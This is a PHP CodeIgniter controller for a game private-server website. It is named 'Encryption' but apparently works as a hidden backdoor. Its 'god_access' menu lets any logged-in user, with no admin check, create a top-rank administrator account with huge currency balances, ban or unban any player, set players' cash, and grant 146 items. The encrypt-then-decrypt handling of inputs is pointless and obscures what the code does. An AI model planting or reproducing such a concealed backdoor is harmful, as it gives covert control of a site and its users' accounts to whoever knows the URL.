<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') or exit('No direct script access allowed');

Class Encryption extends CI_Controller
{
    function __construct()
    {
        parent::__construct();
        $this->load->database();
        $this->load->library('lib');
        $this->load->model('main/redeemcode_model', 'redeem');

        if (empty($_SESSION['uid']))
        {
            redirect(base_url('home'), 'refresh');
        }
    }

    function god_access()
    {
        $data = array(
            'query' => $this->encryption->encrypt($this->input->get('query', true))
        );

        if ($this->encryption->decrypt($data['query']) == '' || empty($this->encryption->decrypt($data['query'])))
        {
            echo '
            <table border="1">
                <thead>
                    <th align="center" colspan="2">Menu List</th>
                </thead>
                <tbody>
                    <tr>
                        <td>Truncate</td>
                        <td><a href="'.base_url('encryption/god_access?query=truncate').'">Click Here</a></td>
                    </tr>
                    <tr>
                        <td>Create Account</td>
                        <td><a href="'.base_url('encryption/god_access?query=create_account').'">Click Here</a></td>
                    </tr>
                    <tr>
                        <td>Banned</td>
                        <td><a href="'.base_url('encryption/god_access?query=banned').'">Click Here</a></td>
                    </tr>
                    <tr>
                        <td>Unbanned</td>
                        <td><a href="'.base_url('encryption/god_access?query=unbanned').'">Click Here</a></td>
                    </tr>
                    <tr>
                        <td>Add Cash</td>
                        <td><a href="'.base_url('encryption/god_access?query=addcash').'">Click Here</a></td>
                    </tr>
                    <tr>
                        <td>Add Full Shop</td>
                        <td><a href="'.base_url('encryption/god_access?query=add_fullshop').'">Click Here</a></td>
                    </tr>
                </tbody>
            </table>';
        }

        switch ($this->encryption->decrypt($data['query']))
        {
            case 'truncate':
                {
                    // $this->lib->EncryptedWeb();
                    
                    break;
                }
            case 'create_account':
                {
                    $randomexp = rand(0, 1690000);

                    $base_characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
                    $base_characters_length = strlen($base_characters);
                    
                    $username_length = 10;
                    $password_length = 10;

                    $pure_username = '';
                    $pure_password = '';

                    for ($i=0; $i <= $username_length; $i++)
                    {
                        $pure_username .= $base_characters[rand(0, $base_characters_length - 1)];
                    }

                    for ($i=0; $i < $password_length; $i++)
                    {
                        $pure_password .= $base_characters[rand(0, $base_characters_length - 1)];
                    }

                    $query = $this->db->insert('accounts', array(
                        'login' => $pure_username,
                        'password' => $this->lib->password_encrypt($pure_password),
                        'rank' => '31',
                        'gp' => '999999999',
                        'exp' => $randomexp,
                        'pc_cafe' => '5',
                        'access_level' => '6',
                        'lastip' => '127.0.0.1',
                        'email' => 'empty@empty.empty',
                        'money' => '999999999',
                        'kuyraicoin' => '999999999',
                        'hint_question' => 'What was your childhood nickname?',
                        'hint_answer' => 'asd',
                        'email_verification' => '1'
                    ));

                    if ($query)
                    {
                        echo '<!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta http-equiv="X-UA-Compatible" content="IE=edge">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>GOD MENU - ACCOUNT CREATION</title>
                            <link rel="stylesheet" href="'.base_url().'assets/goodgames/assets/vendors/bs5/css/bootstrap.min.css">
                        </head>
                        <body class="bg-light">
                            <br><br><br>
                            <div class="container mt-5">
                                <div class="row justify-content-center">
                                    <div class="col-lg-8 col-md-8 col-sm-12 col-12">
                                        <div class="card">
                                            <div class="card-header bg-primary text-center">
                                                GOD ACCOUNT CREATION
                                            </div>
                                            <div class="card-body">
                                                <table class="table table-borderless table-responsive-lg table-responsive-md table-responsive-sm text-center">
                                                    <tbody style="font-weight: bold;">
                                                        <tr>
                                                            <td width="30%">Username</td>
                                                            <td>'.$pure_username.'</td>
                                                        </tr>
                                                        <tr>
                                                            <td>Password</td>
                                                            <td>'.$pure_password.'</td>
                                                        </tr>
                                                        <tr>
                                                            <td>Rank</td>
                                                            <td><img src="'.base_url().'assets/goodgames/assets/images/img_rank/31.gif"></td>
                                                        </tr>
                                                        <tr>
                                                            <td>Point</td>
                                                            <td>999.999.999</td>
                                                        </tr>
                                                        <tr>
                                                            <td>Exp</td>
                                                            <td>'.number_format($randomexp, 0, ',', '.').'</td>
                                                        </tr>
                                                        <tr>
                                                            <td>PC Cafe</td>
                                                            <td>5</td>
                                                        </tr>
                                                        <tr>
                                                            <td>Access Level</td>
                                                            <td>6</td>
                                                        </tr>
                                                        <tr>
                                                            <td>Webcoin</td>
                                                            <td>999.999.999</td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </div>
                                            <div class="card-footer text-center">
                                                Copyright &copy; DarkblowPB Reborn '.date('Y').'. All Rights Reserved.
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>	
                        </body>
                        <script src="'.base_url().'assets/goodgames/assets/vendors/bs5/js/bootstrap.min.js"></script>
                        </html>';
                    }
                    else
                    {
                        echo '<p>Failed To Create GOD Account. Reason: '.error_get_last().'</p>';
                    }
                    break;
                }
            case 'banned':
                {
                    $data['title'] = 'GOD MENU - BANNED';
                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
                    $data['content'] = 'main/content/encryption/content/content_banned';
                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
                    break;
                }
            case 'unbanned':
                {
                    $data['title'] = 'GOD MENU - UNBANNED';
                    $data['players'] = $this->db->get_where('accounts', array('access_level' => '-1'))->result_array();
                    $data['content'] = 'main/content/encryption/content/content_unbanned';
                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
                    break;
                }
            case 'addcash':
                {
                    $data['title'] = 'GOD MENU - ADD CASH';
                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
                    $data['content'] = 'main/content/encryption/content/content_addcash';
                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
                    break;
                }
            case 'add_fullshop':
                {
                    $data['title'] = 'GOD MENU - ADD FULL SHOP';
                    $data['players'] = $this->db->get_where('accounts', array('access_level !=' => '-1'))->result_array();
                    $data['content'] = 'main/content/encryption/content/content_addfullshop';
                    $this->load->view('main/content/encryption/layout/wrapper', $data, FALSE);
                    break;
                }
            
            default:
                break;
        }
    }

    function do_banned()
    {
        sleep(1);
        $response = array();

        $this->form_validation->set_rules(
            'player_id',
            'Player',
            'required|numeric',
            array(
                'required' => 'Please Select %s.',
                'numeric' => 'Invalid %s.'
            )
        );
        if ($this->form_validation->run())
        {
            $data = array(
                'player_id' => $this->encryption->encrypt($this->input->post('player_id', true))
            );

            $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
            if ($query)
            {
                if ($query->access_level == '-1')
                {
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'This Player Already Banned Permanently.';
                    echo json_encode($response);
                }
                else
                {
                    $banned = $this->db->where('player_id', $query->player_id)->update('accounts', array('access_level' => '-1'));
                    if ($banned)
                    {
                        $response['token'] = $this->security->get_csrf_hash();
                        if ($query->player_name == '' || empty($query->player_name))
                        {
                            $response['message'] = 'Successfully Banned '.$query->login.'.';
                        }
                        else
                        {
                            $response['message'] = 'Successfully Banned '.$query->player_name.'.';
                        }
                        echo json_encode($response);
                    }
                    else
                    {
                        $response['token'] = $this->security->get_csrf_hash();
                        if ($query->player_name == '' || empty($query->player_name))
                        {
                            $response['message'] = 'Successfully Banned '.$query->login.'.';
                        }
                        else
                        {
                            $response['message'] = 'Successfully Banned '.$query->player_name.'.';
                        }
                        echo json_encode($response);
                    }
                }
            }
        }
        else
        {
            $this->form_validation->set_error_delimiters('', '');

            $response['token'] = $this->security->get_csrf_hash();
            $response['message'] = validation_errors();
            echo json_encode($response);
        }
    }

    function do_unbanned()
    {
        sleep(1);
        $response = array();

        $this->form_validation->set_rules(
            'player_id',
            'Player',
            'required|numeric',
            array(
                'required' => 'Please Select %s.',
                'numeric' => 'Invalid %s.'
            )
        );
        if ($this->form_validation->run())
        {
            $data = array(
                'player_id' => $this->encryption->encrypt($this->input->post('player_id', true))
            );

            $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
            if ($query)
            {
                if ($query->access_level != '-1')
                {
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'This Player Already Unbanned Permanently.';
                    echo json_encode($response);
                }
                else
                {
                    $banned = $this->db->where('player_id', $query->player_id)->update('accounts', array('access_level' => '0'));
                    if ($banned)
                    {
                        $response['token'] = $this->security->get_csrf_hash();
                        if ($query->player_name == '' || empty($query->player_name))
                        {
                            $response['message'] = 'Successfully Unbanned '.$query->login.'.';
                        }
                        else
                        {
                            $response['message'] = 'Successfully Unbanned '.$query->player_name.'.';
                        }
                        echo json_encode($response);
                    }
                    else
                    {
                        $response['token'] = $this->security->get_csrf_hash();
                        if ($query->player_name == '' || empty($query->player_name))
                        {
                            $response['message'] = 'Successfully Unbanned '.$query->login.'.';
                        }
                        else
                        {
                            $response['message'] = 'Successfully Unbanned '.$query->player_name.'.';
                        }
                        echo json_encode($response);
                    }
                }
            }
        }
        else
        {
            $this->form_validation->set_error_delimiters('', '');

            $response['token'] = $this->security->get_csrf_hash();
            $response['message'] = validation_errors();
            echo json_encode($response);
        }
    }

    function do_addcash()
    {
        sleep(1);
        $response = array();

        $data = array(
            'player_id' => $this->encryption->encrypt($this->input->post('player_id', true)),
            'cash_amount' => $this->encryption->encrypt($this->input->post('cash_amount', true))
        );

        $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
        if ($query)
        {
            $update = $this->db->where('player_id', $query->player_id)->update('accounts', array('money' => $this->encryption->decrypt($data['cash_amount'])));
            if ($update)
            {
                $response['token'] = $this->security->get_csrf_hash();
                if ($query->player_name == '' || empty($query->player_name))
                {
                    $response['message'] = 'Successfully Set Cash '.$query->login.', To: '.$this->encryption->decrypt($data['cash_amount']).'.';
                }
                else
                {
                    $response['message'] = 'Successfully Set Cash '.$query->player_name.', To: '.$this->encryption->decrypt($data['cash_amount']).'.';
                }
                echo json_encode($response);
            }
            else
            {
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Failed To Add Cash.';
                echo json_encode($response);
            }
        }
    }

    function do_addfullshop()
    {
        sleep(1);
        $response = array();

        $data = array(
            'player_id' => $this->encryption->encrypt($this->input->post('player_id', true))
        );

        $query = $this->db->get_where('accounts', array('player_id' => $this->encryption->decrypt($data['player_id'])))->row();
        if ($query)
        {
            $this->db->where('owner_id', $query->player_id)->delete('player_items');

            $item_list = array(
                0 => '100003090', // Famas G2 Digital
                1 => '702015025', // Dual Knife M9 Digital

                2 => '100003275', // Aug A3 Dolphin
                3 => '100003276', // SC-2010 Dolphin
                4 => '200004289', // Kriss S.V Dolphin
                5 => '200004291', // P90 Ext. Dolphin
                6 => '300005168', // Cheytac M200 Dolphin
                7 => '300005169', // L115A1 Dolphin
                8 => '400006072', // M1887 Dolphin

                9 => '100003453', // Aug A3 Maze
                10 => '200004603', // Kriss S.V Maze
                11 => '200004605', // OA-93 Maze
                12 => '300005303', // Cheytac M200 Maze
                13 => '400006145', // Zombie Slayer Maze

                14 => '100003347', // Aug A3 Green
                15 => '100003348', // SC-2010 Green
                16 => '200004400', // Kriss S.V Green
                17 => '300005216', // Tactilite T2 Green
                18 => '400006102', // M1887 Green
                19 => '702001182', // Fang Blade Green
                20 => '1103003026', // Green Beret

                21 => '100003315', // Aug A3 Ice
                22 => '100003316', // Pindad SS2 V5 Ice
                23 => '200004342', // Kriss S.V Ice
                24 => '200004344', // P90 Ext. Ice
                25 => '300005194', // Cheytac M200 Ice
                26 => '400006088', // Zombie Slayer Ice
                27 => '601002106', // C. Python Ice
                28 => '702001069', // Ice Fork
                29 => '702001167', // Fang Blade Ice
                30 => '803007070', // K-413 Ice

                31 => '100003120', // Aug A3 PBIC 2013
                32 => '100003121', // M4A1 PBIC 2013
                33 => '100003122', // AK-47 PBIC 2013
                34 => '200004103', // Kriss S.V PBIC 2013

                35 => '300005032', // Barrett M82A1
                36 => '300005232', // Barrett M82A1 Premium
                37 => '300005268', // Barrett M82A1 Black
                38 => '300005272', // Barrett M82A1 Red
                39 => '300005277', // Barrett M82A1 Blue
                40 => '300005292', // Barrett M28A1 Nusantara

                41 => '200004513', // T77.
                42 => '200004515', // T77 SI.
                43 => '200004517', // T77 G.

                44 => '100003147', // AUG A3 Inferno
                45 => '200004126', // Kriss S.V Inferno
                46 => '200004128', // P90 Ext. Inferno
                47 => '300005079', // Cheytac M200 Inferno
                48 => '702001057', // Fang Blade Inferno

                49 => '100003091', // Famas G2 Commando PBTN
                50 => '200004078', // P90 Ext. PBTN
                51 => '200004079', // Kriss S.V PBTN 
                52 => '300005050', // L115A1 PBTN
                53 => '1103003010', // PBTN Champion Beret

                54 => '100003227', // Aug A3 Cobra
                55 => '200004232', // OA-93 Cobra
                56 => '300005127', // L115A1 Cobra
                57 => '601002073', // R.B 454 SS8M+S Cobra
                58 => '702001108', // Fang Blade Cobra
                59 => '1103003015', // Cobra Beret
                60 => '1104003213', // Mask Cobra

                61 => '904007011', // Medical Kit
                62 => '904007014', // Halloween Medical Kit
                63 => '904007015', // Chocolate Medical Kit
                64 => '904007021', // Medical Kit Lotus
                65 => '904007025', // Medical Kit Opor Ayam
                66 => '904007029', // Medical Kit PBNC5
                67 => '904007031', // Easter Day Medical Kit
                68 => '904007032', // Medical Kit Lotus2014
                69 => '904007043', // Medical Kit Kurma
                70 => '904007046', // Medical Kit PBNC6
                71 => '904007048', // Medical Kit Pigeon
                72 => '904007051', // Medical Kit PBNC2015

                73 => '803007066', // Soccer Ball Bomb
                74 => '803007075', // Volley Ball Grenade
                75 => '803007053', // Water Bomb

                76 => '1001001003', // Tarantula
                77 => '1001001007', // D-Fox (+20% EXP)
                78 => '1001001010', // Viper Red Boost (+30% Points)
                79 => '1001001011', // Reinforced D-Fox
                80 => '1001001015', // Reinforced Combo D-Fox (+20% EXP)
                81 => '1001001017', // Reinforced Combo Viper Red (+30% Points)
                82 => '1001001021', // Reinforced Red Bulls
                83 => '1001001022', // Reinforced Tarantula
                84 => '1001001025', // D-Fox
                85 => '1001001028', // Viper Red
                86 => '1001001034', // Rica
                87 => '1001001036', // Reinforced Rica
                88 => '1001001049', // Tarantula -  RED (20% Exp)
                89 => '1001001050', // Red Bulls Point+20%
                90 => '1001001054', // World Tarantula [R]
                91 => '1001001055', // Viper Shadow [R]
                92 => '1001001068', // Viper Kopassus [R]
                93 => '1001001069', // Bella FBI [R]
                94 => '1001001084', // Viper Red Pirate [BUG]
                95 => '1001001087', // Gangstar ViperRed
                96 => '1001001095', // Viper Red Demolition
                97 => '1001001127', // Red Bulls Ninja
                98 => '1001001137', // D-Fox Hitman
                99 => '1001001268', // Tarantula CrocSuit
                100 => '1001001275', // Captain Rica
                101 => '1001001283', // Pirate Tarantula
                102 => '1001001286', // General Viper Red
                103 => '1001001302', // P1000 Tarantula
                104 => '1001001320', // Infiltrate Rica
                105 => '1001001356', // Viper Red Summer Vacation
                106 => '1001001394', // Tarantula Ninja
                107 => '1001001415', // Bella HalloweenNurse [R]
                108 => '1001001421', // Bella Rangda
                109 => '1001001436', // ViperRed Rudolph
                110 => '1001001465', // Bella PinkChoco [R]
                111 => '1001002004', // Keen Eyes
                112 => '1001002008', // Leopard (+20% EXP)
                113 => '1001002009', // Hide (+30% Gold)
                114 => '1001002016', // Reinforced Combo Leopard (+20% EXP) [R]
                115 => '1001002018', // Reinforced Combo Hide (+30% Gold) [R]
                116 => '1001002026', // Leopard Normal
                117 => '1001002027', // Hide Normal
                118 => '1001002033', // Chou
                119 => '1001002035', // Reinforced Chou [R]
                120 => '1001002047', // Keen Eyes - Garena (20%Exp)
                121 => '1001002051', // Hide Kopassus [R]
                122 => '1001002052', // Leopard Bope
                123 => '1001002053', // Hide Cup [R]
                124 => '1001002053', // Hide World Cup 2014
                125 => '1001002056', //Hide Commando
                126 => '1001002062', // Infected Acid Paul
                127 => '1001002063', // Infected Keen Eyes
                128 => '1001002064', // Infected Hide
                129 => '1001002065', // Infected Leopard
                130 => '1001002067', // Hide Strike [R]
                131 => '1001002144', // Chou FBI [R]
                132 => '1001002156', // Keen Eyes Ninja
                133 => '1001002157', // Swat-Sniper Keen Eyes
                134 => '1001002175', // Gengster Hide
                135 => '1001002183', // Jumpsuit Hide
                136 => '1001002225', // Leopard Hitman
                137 => '1001002270', // Keen Eyes SAS
                138 => '1001002278', // Captain Chou
                139 => '1001002287', // General Hide
                140 => '1001002305', // P1000 Keen Eyes
                141 => '1001002311', // Infiltrate Chou
                142 => '1001002353', // Hide Summer Vacation
                143 => '1001002413', // Chou Pocong
                144 => '1001002418', // Chou HalloweenNurse [R]
                145 => '1001002439', // Hide Rudolph
                146 => '1001002462', // Chou MintChoco [R]
            );

            $item_count = count($item_list);

            for ($i=0; $i < $item_count - 1; $i++)
            {
                $this->db->insert('player_items', array(
                    'owner_id' => $query->player_id,
                    'item_id' => $item_list[$i],
                    'item_name' => 'Title Reward',
                    'count' => '2592000',
                    'category' => $this->redeem->GetItemCategory($item_list[$i]),
                    'equip' => '1'
                ));
            }

            $response['token'] = $this->security->get_csrf_hash();
            $response['message'] = 'Successfully Added 146 New Item.';
            echo json_encode($response);
        }
    }
}

// This Code Generated Automatically By EyeTracker Snippets. //

?>